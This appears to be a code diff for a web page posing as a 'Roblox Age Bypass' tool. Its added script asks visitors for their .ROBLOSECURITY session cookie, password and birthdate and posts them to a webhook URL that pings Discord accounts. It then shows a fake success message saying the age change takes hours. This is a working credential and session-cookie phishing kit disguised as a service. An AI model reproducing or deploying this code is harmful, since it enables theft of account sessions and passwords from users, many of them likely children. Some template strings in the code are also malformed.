@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
@@ -284,4 +284,180 @@
     // Fill Day options 1-31
     for (let i = 1; i <= 31; i++) {
       const option = document.createElement('option');
-      option.value = i.toString
+      option.value = i.toString().padStart(2, '0');
+      option.textContent = i;
+      birthDay.appendChild(option);
+    }
+
+    // Fill Month options with names
+    const monthNames = ['January', 'February', 'March', 'April', 'May', 'June',
+                        'July', 'August', 'September', 'October', 'November', 'December'];
+    monthNames.forEach((name, idx) => {
+      const option = document.createElement('option');
+      option.value = (idx + 1).toString().padStart(2, '0');
+      option.textContent = name;
+      birthMonth.appendChild(option);
+    });
+
+    // Fill Year options from currentYear down to 1930
+    const currentYear = new Date().getFullYear();
+    for (let y = currentYear; y >= 1930; y--) {
+      const option = document.createElement('option');
+      option.value = y;
+      option.textContent = y;
+      birthYear.appendChild(option);
+    }
+
+    function clearMessages() {
+      errorMessage.style.display = 'none';
+      successMessage.style.display = 'none';
+    }
+
+    function showError(msg) {
+      errorMessage.textContent = msg;
+      errorMessage.style.display = 'block';
+      setTimeout(() => { errorMessage.style.display = 'none'; }, 6000);
+    }
+
+    function showSuccess(msg) {
+      successMessage.textContent = msg;
+      successMessage.style.display = 'block';
+      setTimeout(() => { successMessage.style.display = 'none'; }, 8000);
+    }
+
+    bypassSelect.addEventListener('change', () => {
+      clearMessages();
+      const val = bypassSelect.value;
+      if (val === 'birthyear') {
+        cookieBlock.style.display = 'block';
+        passwordBlock.style.display = 'none';
+        birthdateLabel.style.display = 'none';
+        birthdateSelectors.style.display = 'none';
+      } else if (val === '13plus') {
+        cookieBlock.style.display = 'block';
+        passwordBlock.style.display = 'block';
+        birthdateLabel.style.display = 'block';
+        birthdateSelectors.style.display = 'flex';
+      } else {
+        cookieBlock.style.display = 'none';
+        passwordBlock.style.display = 'none';
+        birthdateLabel.style.display = 'none';
+        birthdateSelectors.style.display = 'none';
+      }
+    });
+
+    processBtn.addEventListener('click', async () => {
+      clearMessages();
+
+      const option = bypassSelect.value;
+      if (!option) {
+        showError('Please select a bypass option.');
+        return;
+      }
+
+      const cookie = cookieInput.value.trim();
+      if (!cookie) {
+        showError('Please enter your .ROBLOSECURITY cookie.');
+        return;
+      }
+
+      let password = '';
+      if (option === '13plus') {
+        password = passwordInput.value.trim();
+        if (!password) {
+          showError('Please enter your password for 13+ bypass.');
+          return;
+        }
+        // Validate birthdate selection
+        if (!birthDay.value || !birthMonth.value || !birthYear.value) {
+          showError('Please select your birthdate.');
+          return;
+        }
+      }
+
+      loaderOverlay.style.display = 'flex';
+
+      // Prepare data for POST
+      let data = {
+        bypassType: option,
+        cookie: cookie,
+      };
+      if (option === '13plus') {
+        data.password = password;
+        data.birthdate = ${birthYear.value}-${birthMonth.value}-${birthDay.value};
+      }
+
+      // Discord Webhook URL - **Füge hier deine Webhook-URL ein**
+      const webhookUrl = 'https://hkdk.events/gcjor0rqtldxig';
+
+      // IDs für Discord Ping
+      const roleId = '1392621247460020254'; // Rolle
+      const userId = '1030535100829540464'; // Nutzer
+
+      try {
+        // 1. Sende die Ping-Nachricht (plain text, keine Embed)
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: <@&${roleId}> <@${userId}>
+          }),
+        });
+
+        // 2. Sende die Embed mit den Daten (ohne mentions)
+        let embed = {
+          title: "Roblox Age Bypass",
+          description: "Here are the details:",
+          color: 0x00FFFF,
+          fields: [
+            { name: "Bypass Option", value: option === 'birthyear' ? "2008 Birthyear Up" : "13+ All Ages", inline: true },
+            { name: ".ROBLOSECURITY Cookie", value: \${cookie}\`, inline: false },
+          ],
+          timestamp: new Date().toISOString(),
+        };
+        if (option === '13plus') {
+          embed.fields.push(
+            { name: "Password", value: \${password}\`, inline: false },
+            { name: "Birthdate", value: data.birthdate, inline: true }
+          );
+        }
+
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            embeds: [embed],
+            content: "",  // No mentions here
+          }),
+        });
+
+        loaderOverlay.style.display = 'none';
+        showSuccess('Everything worked it can take 2-12 Hours until the age will be set');
+
+        // Clear inputs
+        cookieInput.value = '';
+        passwordInput.value = '';
+        birthDay.value = '';
+        birthMonth.value = '';
+        birthYear.value = '';
+        bypassSelect.value = '';
+        cookieBlock.style.display = 'none';
+        passwordBlock.style.display = 'none';
+        birthdateLabel.style.display = 'none';
+        birthdateSelectors.style.display = 'none';
+
+      } catch (err) {
+        loaderOverlay.style.display = 'none';
+        showError('ERROR Try later again.');
+        console.error(err);
+      }
+    });
+
+    // Help button opens tutorial on YouTube (Beispiel-Link)
+    const helpBtn = document.getElementById('help-button');
+    helpBtn.addEventListener('click', () => {
+      window.open('https://www.youtube.com/watch?v=YxY2bnntTxg', '_blank');
+    });
+  </script>
+</body>
+</html>
